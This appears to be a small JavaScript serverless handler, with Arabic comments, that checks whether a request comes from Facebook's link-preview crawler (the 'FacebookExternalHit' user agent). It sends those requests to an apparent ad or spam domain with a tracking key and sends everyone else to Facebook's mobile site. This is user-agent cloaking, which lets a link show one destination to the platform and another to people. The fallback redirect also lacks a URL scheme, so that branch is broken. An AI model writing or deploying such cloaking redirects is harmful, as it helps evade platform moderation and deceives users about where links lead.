export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';

  // تحقق مما إذا كان الطلب قادم من Facebook
  if (userAgent.includes('FacebookExternalHit')) {
    // إعادة التوجيه إلى URL مخصص لمستخدمي Facebook
    res.redirect(301, 'https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb');
  } else {
    // إعادة التوجيه إلى URL آخر أو عرض محتوى مختلف لمستخدمي الويب العاديين
    res.redirect(301, 'm.facebook.com');
  }
}
